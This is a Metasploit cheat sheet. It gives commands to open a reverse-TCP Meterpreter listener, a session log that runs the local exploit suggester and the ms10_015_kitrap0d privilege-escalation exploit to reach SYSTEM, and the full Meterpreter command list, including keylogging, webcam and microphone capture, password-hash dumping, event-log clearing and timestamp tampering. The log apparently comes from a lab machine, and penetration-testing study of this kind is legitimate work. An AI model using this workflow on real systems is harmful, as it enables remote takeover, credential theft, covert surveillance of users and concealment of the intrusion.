https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

# Open Listener for Reverse Shell
```
msfconsole

msf> use exploit/multi/handler

msf  exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf  exploit(multi/handler) > options (to list everything it needs to work)

msf  exploit(multi/handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55)

msf exploit(multi/handler) > set LPORT <Listening_Port> (for example set LPORT 4444)

msf exploit(multi/handler) > run
```

# Built-in Exploit Suggester
```
meterpreter > run post/multi/recon/local_exploit_suggester 

[*] 10.129.30.24 - Collecting local exploits for x86/windows...
[*] 10.129.30.24 - 34 exploit checks are being tried...
[+] 10.129.30.24 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.30.24 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.  <== using this exploit
[+] 10.129.30.24 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.129.30.24 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.129.30.24 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.30.24 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.30.24 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.129.30.24 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.30.24 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.30.24 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.30.24 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.129.30.24 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
meterpreter > 
meterpreter > background
[*] Backgrounding session 2...   <== important to know for later
msf5 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.   <== session infor from earlier


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.22     yes       The listen address (an interface may be specified)   
   LPORT     4444             yes       The listen port    


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf5 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
lhost => tun0
msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 2
session => 2
msf5 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.114:4444 
[*] Launching notepad to host the exploit...
[+] Process 1236 launched.
[*] Reflectively injecting the exploit DLL into 1236...
[*] Injecting exploit into 1236 ...
[*] Exploit injected. Injecting payload into 1236...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.129.30.30
[*] Meterpreter session 3 opened (10.10.14.114:4444 -> 10.129.30.30:49158) at 2020-10-29 16:38:37 -0700

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

# Load Powershell
```
meterpreter > load powershell
```


# Meterpreter: Help

```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user's desktop in real time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes
```



